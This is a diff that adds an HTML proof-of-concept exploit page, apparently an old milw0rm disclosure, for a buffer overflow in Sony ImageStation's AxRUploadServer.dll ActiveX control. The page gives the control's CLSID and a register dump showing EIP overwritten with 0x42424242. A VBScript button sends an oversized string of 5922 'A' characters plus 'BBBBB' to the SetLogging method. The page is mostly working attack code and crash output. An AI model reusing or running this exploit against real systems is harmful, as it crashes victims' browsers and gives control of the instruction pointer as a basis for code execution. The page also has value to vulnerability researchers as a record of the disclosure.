@@ -1,0 +1,46 @@
+<html>
+<head><title>Buffer Overflow Vulnerability in AxRUploadServer.dll, Activex Method (SetLogging)</title></head>
+<body>
+Dll name:AxRUploadServer.dll
+Download: http://www.imagestation.com/common/classes/SonyISUpload.cab?v=1,0,0,38
+</br></br>
+Description:
+This file belongs to ImageStation that is a servicemark of Sony Electronics Inc.
+</br></br>
+Internal name:
+The ez-Upload control.
+</br></br>
+Access Violation when executing 0x42424242</br>
+........................................</br>
+Registers:</br>
+--------------------------------------------------</br>
+EIP 42424242</br>
+EAX 42424242</br>
+EBX 00000001</br>
+ECX 00FE50B0 -> 00FE0290</br>
+EDX 00FE0608 -> 00187440 -> Uni: @t@t</br>
+EDI 00000000</br>
+ESI 00000000</br>
+EBP 0013E6C4 -> 0013E6E4</br>
+ESP 0013E68C -> 0145636A -> Asc: jcEjcE</br>
+</br></br></br>
+Discovered by:</br>
+Trancek, http://www.trancek.es
+</br></br>
+Greetz: p1mp4m.es(sky, pepepistola, elvispresley, patoruzu, musashi)
+</br></br></br>
+<object classid='clsid:E9A7F56F-C40F-4928-8C6F-7A72F2A25222' id='bof'></object>
+<input language=VBScript onclick=Son() type=button value="Explotar">
+
+<script language='vbscript'>
+ Sub Son
+	arg1=String(5922, "A")
+	arg2=String(5, "B")
+
+	bof.SetLogging arg1 + arg2
+ End Sub
+</script>
+</body>
+</html>
+
+# milw0rm.com [2008-02-08]
